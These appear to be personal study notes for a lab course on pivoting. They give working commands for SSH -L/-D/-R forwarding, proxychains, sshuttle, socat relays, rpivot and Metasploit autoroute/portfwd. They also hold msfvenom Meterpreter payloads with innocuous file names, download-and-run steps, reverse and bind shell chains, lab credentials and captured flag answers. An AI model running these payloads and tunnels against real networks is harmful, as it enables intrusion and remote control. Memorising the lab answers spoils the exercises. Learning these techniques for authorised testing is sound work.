# Introduction to Pivoting, Tunneling, and Port Forwarding

## Core situation 
During a red team engagement, pentest, or AD assessment, you may already have the credentials/keys/hashes/tokens to reach another host, but that host isn't directly reachable from your attack machine. The solution is to route through a host you've already compromised.

**First things to check** when you land on a new host:
- Privilege level
- Network connections
- And any VPN
- Remote-access software

If the host has more than one network adapter, it can likely reach a different network segment.

## The three concepts (kept distinct on purpose)
### Pivoting
Moving through a compromised host to reach networks you otherwise couldn't. Its main purpose is to defeat segmentation (physical or logical) and get into isolated networks. Think deeper into the network. A compromised pivot host goes by many names: pivot host, proxy, foothold, beach head system, jump host.

- Example: The target network was physically and logically separated. You compromise a dual-homed engineering workstation (one NIC on the enterprise network, another on the operational network) and use it to cross into the otherwise-unreachable operational environment.

### Tunneling
A subset of pivoting. It encapsulates traffic inside another protocol to route it while avoiding detection. The analogy in the text: hiding a key inside a stuffed toy so inspectors see only the toy, only your partner knows what's really inside. The goal is obfuscation, using protocols like HTTPS over TLS or SSH. It also enables data exfiltration and payload delivery.

- Example: Masking Command & Control (C2) traffic inside HTTP/HTTPS GET and POST requests so it looks like ordinary web traffic. Well-formed packets reach your C2 server; malformed ones get redirected elsewhere to throw off defenders.

### Lateral Movement
Often used interchangeably with pivoting, but not the same. It extends access to additional hosts, apps, and services within an environment, and often enables privilege escalation across hosts. Think wide across the network.
- Example: You compromise the local administrator account, scan the network, find three more Windows hosts, reuse the same local admin credentials, and one host accepts them, letting you move laterally.

### The one-line distinction to remember
> **Lateral Movement** = Spread wide (more hosts, higher privileges)
> **Pivoting** = go deeper (reach previously unreachable network segments)
> **Tunneling** = hide the traffic while doing it

# The Networking Behind Pivoting
## IP Addressing & NICs
Every computer on a network needs and IP address. No IP, not on the network. Addresses are assigned in software, usually automatically via DHCP, though static assignment is common for servers, routers, switch virtual interfaces, printer, and any device providing critical services.

The IP is assigned to a NIC (Network Interface Controller / card / adapter). A machine can have multiple NICs (physical or virtual) and therefore multiple IPs, meaning it cant each multiple networks. This is the heart of pivoting: the IPs on a compromised host reveal which networks it can reach, so always check for additional NICs.

### Linux/macOS
```
ifconfig
```

Key reading of the output: each NIC has an identifier (`eth0`, `eth1`, `lo`, `tun0`) plus addressing and traffic stats.
- `tun0` = an active VPN tunnel interface (this is what HTB's VPN creates so you can reach the lab networks, unreachable without the tunnel)
- `eth0` had a public, internet-routable IP (`134.122.100.200`), the kind you see on internet-facing hosts in a DMZ
- The other NICs had private IPs (routable internally, not over the public internet). NAT translates between private and public.

### Windows
```
ipconfig
```

The example host had multiple adapters but only one with IPs assigned, showing both IPv6 and IPv4 in a dual-stack config. This module focuses on IPv4, still the most common in enterprise LANs.

Also remember: every IPv4 address has a subnet mask (the "area code" to the IP's "phone number") that defines the network vs. host portion. Traffic bound for a different network goes to the host's default gateway (usually the router's NIC for that LAN). For ´pivoting, document as much IP info as possible.

## Routing
Any computer can act as a router, not just the appliance connecting you to the internet. Some module challenges require making a pivot host route traffic to another network, one method shown later is AutoRoute, which gives your attack box routes to target networks reachable only through a pivot host.

A router's defining trait is a routing table used to forward traffic by destination IP. View it on Pwnbox with:
```
netstat -r
ip route
```

How to read it: when a packet is built, the routing table decides where it goes. Forwarded to a Gateway out of the matching NIC (`Iface`). Pwnbox learned its routes from directly connected interfaces (`eth0`, `eth1`, `tun0`), not from routing protocols (EIGRP, OSPF, BGP). Standalone routers typically learn routes through a mix of static routes, dynamic protocols, and directly connected interfaces. Anything destined for a network not in the table goes to the default route (default gateway, gateway of last resort). When hunting for pivot opportunities, check the routing table to see which networks you can reach or which routes you may need to add.

## Protocols, Services & Ports
Protocols are the rules governing communication, and many map to ports that act as identifiers. Logical ports aren't physical, they're assigned in software to applications. An IP identifies a reachable computer; an open port on that IP identifies an application you may be able to connect to. Connection to ports/protocols allowed through the firewall is often how you gain a foothold.

Example: a web server on **HTTP (port 80)** — admins can’t block inbound 80 without taking down the site, so that same port carrying legitimate traffic becomes a way in. Also keep in mind a **source port** is generated client-side to track connections, so stay mindful of which ports you use to ensure payloads connect back to your intended listeners.

#### Practical tip (from LTNB0B)
The module gets progressively harder with multi-host networks to practice on. The advice worth keeping: **draw out the network topologies** as you go — tools like **Draw.io** help you build a visual of the environment and double as documentation while you look for pivot opportunities.

# Dynamic Port Forwarding with SSH and SOCKS Tunneling
This section moves from theory into the actual pivoting workflow: using SSH to forward ports and then build a SOCKS proxy to scan and attack an otherwise unreachable network.
## Port Forwarding in context
Port forwarding redirects a communication request from one port to another. It uses TCP as the primary transport, but the forwarded traffic can be encapsulated inside other protocols like SSH or SOCKS, which is what lets you bypass firewalls and reuse services on a compromised host to pivot.

## SSH Local Port Forwarding
The scenario: your attack host (`10.10.15.x`) has compromised an Ubuntu server (`10.129.x.x`). You want MySQL (port 3306), but it's bound locally on the Ubuntu box, unreachable directly, and you can't run a remote exploit against it without forwarding.

First, scan the pivot target:
```
nmap -sT -p22,3306 10.129.202.64
```

SSH is open, MySQL (3306) is closed to you externally. So forward your local port 1234 over SSH to the server's localhost:3306:
```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

`-L` tells the SSH client to forward everything you send to local port `1234` to `localhost:3306` on the Ubuntu server, giving you MySQL locally on 1234.

![[Pasted image 20261015091303.png]]

Verify the forward is listening:
```
netstat -antp | grep 1234

nmap -v -sV -p1234 localhost
```

Nmap confirms `1234/tcp open mysql MySQL 8.0.28`.
## Forwarding multiple ports
Chain more `-L` arguments. This also forwards the server's Apache (port 80) to your local 8080:
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### Setting Up to Pivot
Run `ifconfig` on the Ubuntu host to spot pivot opportunities:
```
ifconfig
```

The output reveals the box is dual-homed:
- `ens192`-> `10.129.202.64`: The network facing your attack host
- `ens224` -> `172.16.5.129`: A second network (`172.16.5.0/23`) you couldn't otherwise reach
- `lo` -> loopback

The problem: unlike before, you don't know which services live on that second network, and your attack host has no route to `172.16.5.0/23`. A single `-L` forward won't cut it, you need **dynamic** forwarding to scan the whole subnet through the pivot.

## SSH Tunneling over a SOCKS Proxy
SOCKS (Socket Secure) routes traffic through a server on behalf of a client, which is ideal for slipping past firewall restrictions, and it can pivot out of NAT'd networks. Two versions: SOCKS4 (no auth, no UDP) and SOCKS5 (adds authentication and UDP support).

Enable **dynamic port forwarding**, SSH opens a SOCKS listener on local port `9050`, and anything sent there is routed over SSH into the `172.16.5.0/23` network:
```
ssh -D 9050 ubuntu@10.129.202.64
```

`-D` requests dynamic port forwarding. Now you need something to push other tools' traffic through port 9050, that's proxychains, which redirects TCP connections through SOCKS/HTTP(S)/TOR proxies and hides your real IP (the target only sees the pivot host's IP).

![[Pasted image 20261015091347.png]]

Point proxychains at port 9050 by editing `/etc/proxychains.conf`, the last line should read `socks4 127.0.0.1 9050`. Check it with:
```
sudo apt install proxychains
tail -4 /etc/proxychains.conf
# Add this line if missing:
socks4 127.0.0.1 9050
```

### Scanning Through the Tunnel (SOCKS Tunneling)
Run a ping sweep across the subnet, routed through the proxy:
```
proxychains nmap -v -sn 172.16.5.1-200
```

Two critical constraints to remember:
- **Only full TCP connect scans work over proxychains,** it can't understand partial packets, so half-connect (SYN) scans return wrong results.
- **Host-alive checks may fail against Windows** targets, since Windows Defender firewall blocks ICMP (ping) by default.

Because a full connect scan across a whole range is slow, scan an individual known-alive host, a Windows box at `172.16.5.19`, with host discovery disabled (`-Pn`), and a full connect scan (`-sT`):
```
proxychains nmap -v -Pn -sT 172.16.5.19
```

This reveals open ports including 445, 135, 139, and RDP on 3389.

### Key Limitations
- Proxychains only supports full TCP connect scans (`-sT`). It can't handle partial packets, so half-open/SYN scans return wrong results.
- Host-alive checks (ICMP ping) often fail against Windows, Windows Defender firewall blocks ICMP by default. Use `-Pn`.
- Full TCP connect scans across a whole range are slow; prefer scanning individual hosts or small known-alive ranges.

## Pivoting Other Tools Through Proxychains
Run Metasploit through the tunnel:
```
proxychains msfconsole
```

Use the RDP scanner module against the internal host:
```
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
set rhosts 172.16.5.19
run
```

Log into the internal windows host over the SOCKS tunnel via RDP (accept the cert prompt):
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Summary Flow
1. Compromise host
2. `ifconfig` to find a second network
3. `ssh -D 9050` top open SOCKS tunnel
4. Configure `proxychains.conf`
5. Run nmap, msfconsole, xfreerdp with proxychains to scan, enumerate, and access internal hosts you otherwise couldn't reach

## Connect to HTB
#### You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

```bash
sudo apt install proxychains
tail -4 /etc/proxychains.conf
# socks4 127.0.0.1 9050

proxychains nmap -v -Pn -sT 10.129.201.220
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

ssh -D 9050 ubuntu@10.129.201.220

# Inside
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:13:c6:37 brd ff:ff:ff:ff:ff:ff
    inet 10.129.201.220/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3196sec preferred_lft 3196sec
    inet6 dead:beef::a0de:adff:fe13:c637/64 scope global dynamic mngtmpaddr
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::a0de:adff:fe13:c637/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:2c:43:0d brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.129/23 brd 172.16.5.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::a0de:adff:fe2c:430d/64 scope link
       valid_lft forever preferred_lft forever

# In another terminal
proxychains nmap -v -Pn -sT 172.16.5.19
```

- `-sT` -> full TCP connect scan (proxychains cannot do SYN/`-sS` scans, they return garbage)
- `-Pn` -> skip host discovery (Windows Defender blocks ICMP, so a ping check would mark it dead)

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Remove/Reverse Port Forwarding with SSH
## Where This Fits
You've done **local** forwarding (`-L`, pull a remote service to your local port), and **dynamic** forwarding (`-D`, SOCKS tunnel to scan a remote network). **Remote/reverse** forwarding (`-R`) does the opposite: it forwards a local service to a remote port, used when you need a connection to come back to you from a network that has no route to your attack host.

## The Problem It Solves
The Windows target (172.16.5.19) can only talk to its own `172.16.5.0/23` network. It has no route to your attack host on `10.129.x.x`. So if you start a Metasploit listener and fire a reverse shell, the payload has nowhere to send the connection, the Windows box doesn't know how to reach you.

RDP alone often isn't enough during an engagement (file upload/download with clipboard disabled, running exploits, Meterpreter-level enumeration via Windows API). You need a real shell.

### Fix
Use the Ubuntu pivot (which can reach both networks) as the middleman. The payload connects back to the pivot's internal IP (172.16.5.129), and SSH `-R` forwards that back to your listener.

## Step-by-Step
### 1. Create the Meterpreter payload
Set `lhost` to the pivot's internal IP (not yours)
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### 2. Configure and start the handler
On your attack host (listening locally on 8000):
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

### 3. Copy the payload to the pivot
Over SSH:
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

### 4. Serve the payload from the pivot
So the Windows box can grab it:
```
python3 -m http.server 8123
```

### 5. Download the payload onto de Windows target (via browser or PowerShell)
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### 6. Set up the reverse forward with SSH `-R`
Pivot listens on its `172.16.5.129:8000` and forwards every incoming connection to your listener on `0.0.0.0:8000`:
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

- `-R` -> remote forward (pivot listens, forwards back to you)
- `-vN` -> verbose, and no login shell (just the tunnel)

### 7. Execute `backupscript.exe` on the Windows target
The payload connects to the pivot's 8080 -> SSH tunnels it to your 8000 -> Meterpreter session opens

### Traffic Flow

```
Windows (172.16.5.19)
   │  connects back to pivot's 8080
   ▼
Ubuntu pivot (172.16.5.129:8080)  ──SSH -R tunnel──►  Attack host (0.0.0.0:8000) = MSF listener
```

### Key Detail
Your Meterpreter session will show the incoming connection as coming from **127.0.0.1**, not the Windows host — because you’re receiving it over the local SSH socket, not directly. Confirm with `netstat` that the connection belongs to the SSH service.
![[Pasted image 20261015102813.png]]
## Connect to HTB
#### Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)
```
172.16.5.129
```
#### What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)
```
0.0.0.0
```

```bash
# From the attack host
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run

# From the attack host
scp backupscript.exe ubuntu@10.129.201.220:~/

# From the pivot
python3 -m http.server 8123

# From the attack host
ssh -D 9050 ubuntu@10.129.201.220
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Open the PowerShell with Admin permissions
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# From the attack host, on another terminal
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.201.220 -vN

# We open the backupscript.exe

# We wait a few seconds and we obtain a shell
shell
cd C:\Users\victor\Desktop
type flag.txt.txt
```

> N1c3Piv0t

# Meterpreter Tunneling & Port Forwarding
## Where This Fits
Instead of relying on SSH for forwarding, this section does the whole pivot through a Meterpreter session on the Ubuntu host. You get Metasploit's conveniences (autoroute, SOCKS proxy, portfwd) without juggling separate SSH commands.

## 1. Get a Meterpreter Shell on the Pivot (Ubuntu)
Create a **Linux** payload pointing back at your attack host:
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Start the handler:
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

Copy it to the pivot, make it executable, run it:
```
chmod +x backupjob
./backupjob
```

You know have a Meterpreter session on Ubuntu (`pwd` -> `/home/ubuntu`).

## 2. Discover Hosts: Ping Sweep
From Meterpreter (works only if the target firewall allows ICMP):
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Or one-liners directly on the pivot:
```
# Linux
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

Note: run the sweep twice. The first pass may fail while the ARP cache builds.

## 3. If ICMP is Blocked: SOCKS Proxy + AutoRoute (the key technique)
This routes Nmap and other tools through the Meterpreter session.

### Start MSF's SOCKS proxy
```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
jobs          # confirm it's running
```

**Confirm proxychains config** has (switch to socks5 if version 5):
```
socks4  127.0.0.1 9050
```

Add the route so traffic reaches the internal subnet, pick either:
```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

or from inside the session:
```
run autoroute -s 172.16.5.0/23
run autoroute -p          # list active routes to verify
```

Test it: You should see the `S-chain ... OK` line:
```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### 4. Port Forwarding with `portfwd` (local relay)
Alternative to proxychains for a single service. Opens a local listener that relays to the internal target through the session:
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
`-l 3300` listen locally, `-p 3389` remote port, `-r` remote host. Then RDP to your **own localhost**:
```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Verify with:
```
netstat -antp
```

## 5. Reverse Port Forwarding with `portfwd -R`
For pulling a shell _back_ through the pivot. Pivot listens on 1234, forwards to your attack host on 8081:
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Background the session and set up the handler:
```
bg
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run
```

Build the Windows payload pointing at the **pivot’s internal IP** on port 1234:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Execute on Windows → shell arrives via Ubuntu → your 8081.

### Quick Comparison of the Three Methods

| Technique                   | What it does                            | Command                                   |
| --------------------------- | --------------------------------------- | ----------------------------------------- |
| **autoroute + socks_proxy** | Route _any_ tool (Nmap) into the subnet | `run autoroute -s …` + `socks_proxy`      |
| **portfwd** (local)         | Relay one service to your localhost     | `portfwd add -l 3300 -p 3389 -r <target>` |
| **portfwd -R** (reverse)    | Pull a shell back through the pivot     | `portfwd add -R -l 8081 -p 1234 -L <you>` |

---

This is the cleaner path for the task you’re mid-way through: once you have a Meterpreter session on Ubuntu, `autoroute -s 172.16.5.0/23` plus the SOCKS proxy lets you `proxychains xfreerdp` to 172.16.5.19 with no SSH tunnel needed — and `portfwd add -l 3300 -p 3389 -r 172.16.5.19` gives you an even simpler `xfreerdp /v:localhost:3300` route to the same desktop and that `Flag.txt`.

## Connect to HTB
```bash
msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=10.129.201.220 LPORT=8080 -f elf -o backupjob

# Terminal 1
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set RHOST 10.129.201.220
set LPORT 8080
run

# Terminal 2
scp backupjob ubuntu@10.129.201.220:~/
ssh ubuntu@10.129.201.220
chmod +x backupjob
./backupjob

# Terminal 1
run autoroute -s 172.16.5.0/23
run autoroute -p

portfwd add -l 3300 -p 3389 -r 172.16.5.19
bg

# Terminal 3
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

# Socat Redirection with a Reverse Shell
## Where This Fits
Instead of SSH `-R` to forward a reverse shell through the pivot, this uses **socat** — a bidirectional relay that pipes two network channels together. Simpler than SSH tunneling: socat listens on the pivot and blindly forwards everything to your attack host’s listener.

## How It Works
The Windows payload connects back to the **pivot** (172.16.5.129), socat catches that traffic and redirects it to **your** attack host, where your Metasploit handler is waiting. The target never needs a route to you — socat bridges the two networks.

## Steps
### 1. Start the socat listener on the pivot (Ubuntu)
```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- Listens on the pivot’s port `8080`
- `fork` → handles multiple/repeated connections instead of dying after one
- Forwards everything to your attack host (`10.10.14.18`) on port `80`

### 2. Create the Windows payload - LHOST = the pivot's IP, LPORT = socat's listen port
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

The payload dials back to `172.16.5.129:8080` (socat), **not** directly to you. Transfer it to the Windows host.

### 3. Start your handler on the attack host: listening on the port socat forwards to (80):
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

### 4. Execute the payload on Windows 
The connection flows:
```
Windows ──► pivot 172.16.5.129:8080 (socat) ──► your host 10.10.14.18:80 (handler)
```

### Key Detail
Your Meterpreter session shows the incoming connection as coming from the **pivot** (or 127.0.0.1), not the real Windows host — because socat is relaying on its behalf. `getuid` confirms you landed on the target: `INLANEFREIGHT\victor`.

### Mapping to Your Setup

For your lab, substitute:

- `10.10.14.18` → your IP `10.10.15.3`
- `172.16.5.129` → stays the same (your pivot’s internal NIC)

```
# on the pivot:
socat TCP4-LISTEN:8080,fork TCP4:10.10.15.3:80

# your payload:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

## Connect to HTB
```bash
# Terminal 1
ssh ubuntu@10.129.201.254
socat TCP4-LISTEN:8080,fork TCP4:10.10.15.3:80

# Terminal 2
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

# Terminal 3
scp backupscript.exe ubuntu@10.129.201.254:~/
ssh -D 9050 ubuntu@10.129.201.254
python3 -m http.server 8123

# Terminal 4
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Execute the program and wait for the connection
```

# Socat Redirection with a Bind Shell
### Why This One Will Actually Work for You
This is the **bind** version — and crucially, every connection goes in the direction your environment allows: **you → pivot → Windows**. Nothing has to connect _back_ to your `10.10.15.3`. This sidesteps the dead return path that broke socat-reverse, SSH `-R`, and reverse_https. This is the right method for your setup.
### How It Works
The Windows payload **listens** (binds) on a port instead of calling out. Socat on the pivot listens too, and forwards your handler’s connection through to the Windows listener. Flow:
```
YOU (msf bind handler) ──► pivot 172.16.5.129:8080 (socat) ──► Windows 172.16.5.19:8443 (payload)
```
All outbound from your side. No return route needed.

### Steps
**1. Create the Windows bind payload** (no LHOST — it just listens on LPORT):
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```
**2. Start the socat bind redirector on the pivot** — listen on 8080, forward to the Windows host’s 8443:
```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
**3. Start the Metasploit bind handler — RHOST = the pivot** (that’s who you connect to; socat relays it onward):
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.201.254
set LPORT 8080
run
```
**4. Execute `backupjob.exe` on Windows.** It binds 8443, your handler connects to the pivot’s 8080, socat relays to Windows, session opens. `getuid` → `INLANEFREIGHT\victor`.

### Your Exact Commands
```
# Terminal 1 — pivot (SSH in first):
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Terminal 2 — build payload:
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Terminal 2 — handler (RHOST = pivot IP):
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.201.254
set LPORT 8080
run
```

**Transfer `backupjob.exe` to Windows** (you’ve got RDP/python-server working) and run it.

### Sequencing (important for bind shells)

1. Payload running/listening on Windows **first**
2. Socat running on the pivot
3. _Then_ `run` the handler — it connects outward through the chain

```bash
# ========================================================
# SOCAT REDIRECTION WITH A BIND SHELL — full working chain
# Pivot (Ubuntu): 10.129.201.254 / internal NIC 172.16.5.129
# Windows target: 172.16.5.19
# Attack host (Kali): 10.10.15.3
# ========================================================

# --- Terminal 2 (Kali): build the Windows bind payload ---
# bind_tcp = Windows LISTENS on LPORT, we connect TO it (no return route needed)
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# --- Terminal 3 (Kali): copy payload to pivot, serve it over HTTP ---
scp backupjob.exe ubuntu@10.129.201.254:~/
ssh ubuntu@10.129.201.254
python3 -m http.server 8123          # run this on the pivot

# --- On Windows (RDP PowerShell): download and execute the payload ---
# Pull it from the pivot's internal IP; run it so it binds 8443 (window will hang = good)
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupjob.exe" -OutFile "C:\backupjob.exe"
C:\backupjob.exe

# --- On Windows (second PowerShell): confirm it's listening ---
netstat -an | findstr ":8443"        # expect: TCP 0.0.0.0:8443 ... LISTENING

# --- Terminal 1 (Kali): SSH to pivot, start the socat redirector ---
# Listen on 8080, forward everything to the Windows bind listener on 8443
ssh ubuntu@10.129.201.254
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443   # leave running

# (optional sanity check from the pivot: can it reach the Windows listener?)
nc -zv 172.16.5.19 8443              # expect: succeeded

# --- Terminal 2 (Kali): start the Metasploit bind handler ---
# RHOST = the PIVOT (socat relays our connection onward to Windows)
# IMPORTANT: socat must already be running before you 'run'
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.201.254
set LPORT 8080
run
# Flow: handler -> pivot:8080 (socat) -> Windows:8443 (payload) -> Meterpreter

# --- In the Meterpreter session: grab the flag ---
getuid
shell
type C:\Users\victor\Desktop\Flag.txt
```

# SSH for Windows: plink.exe
## Where This Fits
Everything so far used a Linux attack host. **Plink** is the Windows equivalent for creating SSH tunnels — part of the PuTTY package. Two use cases: pivoting _from_ a compromised Windows host (living off the land if PuTTY is already present), or using a Windows machine as your primary attack host.

## Why It Matters
If you land on a locked-down Windows box, pulling your own tools risks detection. If PuTTY/Plink is already there — or on a file share — you can **use what’s already present** to build your pivot and stay quieter.

## Steps
### 1. Start a dynamic port forward (SOCKS proxy) with Plink
Same idea as `ssh -D` on Linux:
```
plink -ssh -D 9050 ubuntu@10.129.15.50
```

Opens an SSH session to the Ubuntu pivot and makes Plink listen on local port 9050.

### 2. Route traffic through it with Proxifier
Proxifier is the Windows counterpart to proxychains — it tunnels desktop-app traffic through a SOCKS/HTTPS proxy and supports proxy chaining. Create a profile pointing at:
- SOCKS server: `127.0.0.1`
- Port: `9050`

### 3. Launch the RDP client through the proxy
With Proxifier routing `127.0.0.1:9050`, start the native Windows RDP client against the internal target:
```
mstsc.exe
```
### Linux ↔ Windows Tooling Map

|Linux|Windows equivalent|
|---|---|
|`ssh -D 9050`|`plink -ssh -D 9050`|
|proxychains|Proxifier|
|xfreerdp|mstsc.exe|

## Connect to HTB
#### Attempt to use Plink from a Windows-based attack host. Set up a proxy connection and RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. When finished, submit "I tried Plink" as the answer.
```
ssh -D 9050 ubuntu@10.129.201.254
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

plink -ssh -D 9050 ubuntu@10.129.201.254
dir C:\ /s /b | findstr /i plink
```

# SSH Pivoting with Sshuttle
## Where This Fits
Sshuttle is a Python tool that eliminates proxychains entirely. It automates iptables rules so traffic to the internal subnet routes through the SSH pivot transparently: you run tools (nmap, xfreerdp) normally, no `proxychains` prefix. Limitation: SSH only (no TOR/HTTPS proxy support).

## Why It's Nice
It sets up the pivot route at the system level, so **any tool works directly** against internal hosts as if you were on that network.


## Steps
### 1. Install sshuttle (attack host)
```
sudo apt-get install sshuttle
```

### 2. Run it
`-r` for the remote pivot (user@IP), followed by the subnet to route through it:
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
It’ll prompt for the ubuntu SSH password, then insert iptables rules redirecting all `172.16.5.0/23` traffic through the pivot. `-v` is verbose (optional).

### 3. Use any tool directly - no proxychains:

```
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

or RDP straight at the internal target:

```
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Connect to HTB
```bash
# install
sudo apt-get install sshuttle

# start the tunnel (routes the internal subnet through the pivot)
sudo sshuttle -r ubuntu@10.129.201.254 172.16.5.0/23 -v

# then use tools directly — no proxychains:
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Web Server Pivoting with Rpivot
## Where This Fits
Rpivot is a reverse SOCKS proxy Python2). Unlike normal SOCKS where you connect _in_, rpivot has the compromised host **connect back out** to your attack host — useful when the internal network can reach out but you can’t reach in. Here it’s used to browse an internal web server (`172.16.5.135:80`).

### How It Works
- Your attack host runs the **server** (listens for the pivot to call home + exposes a local SOCKS port).
- The compromised pivot runs the **client**, which back-connects to your server.
- Traffic then flows: your tools → local SOCKS 9050 → rpivot → pivot → internal network.

## Steps
### 1. Clone rpivot on your attack host
```
git clone https://github.com/klsecservices/rpivot.git
```

### 2. Start the server on your attack host
`--proxy-port 9050` is your local SOCKS, `--server-port 9999` is where the client connects:
```
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### 3. Transfer rpivot to the pivot
```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

### 4. Run the client on the pivot --- it back-connects to your attack host
```
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

Confirm on the server side:
```
New connection from host 10.129.202.64, source port 35226
```

### 5. Point proxychains at 127.0.0.1:9050
The port server.py opened, then use any tool:
```
proxychains firefox-esr 172.16.5.135:80
```

## NTLM-Authenticated Proxy Variant
If the org uses an HTTP proxy with NTLM auth (common with a Domain Controller), rpivot can authenticate through it:
```
python client.py --server-ip <TargetWebServer> --server-port 8080 --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 --domain <WindowsDomain> --username <user> --password <pass>
```

### Key Point
Rpivot is **reverse** — the pivot calls out to you. This means, like socat-reverse and reverse_https, **it needs the pivot to reach your attack host.** In your environment the pivot can’t route back to `10.10.15.3` (you proved this), so rpivot’s client back-connect to `10.10.15.3:9999` will fail the same way. This is a read-and-understand section for you, not a runnable one — the inbound/bind-style methods (SSH `-D`, sshuttle, bind_tcp) are what actually work on your local-Kali-over-VPN setup.

## Connect to HTB
#### From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.
> Attack Host

#### From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.
> Pivot Host

#### Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.
```bash
